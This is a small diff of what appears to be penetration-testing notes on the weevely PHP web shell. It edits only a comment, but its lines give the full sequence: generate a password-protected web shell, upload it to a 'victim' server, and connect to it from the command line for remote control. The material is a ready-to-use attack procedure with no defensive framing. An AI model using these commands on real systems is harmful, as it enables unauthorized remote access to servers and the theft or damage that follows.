@@ -8,7 +8,7 @@ weevely generate 1234 ./weevley.php
 
 ### upload file to victim
 
-# get webshell
+# From the command line run (get webshell) NOT IN BROWSER
 # weevely http://xxx.xxx.xxx.xxx/<outputfile.php> <password>
 
 weevely http://xxx.xxx.xxx.xxx/weevley.php 1234
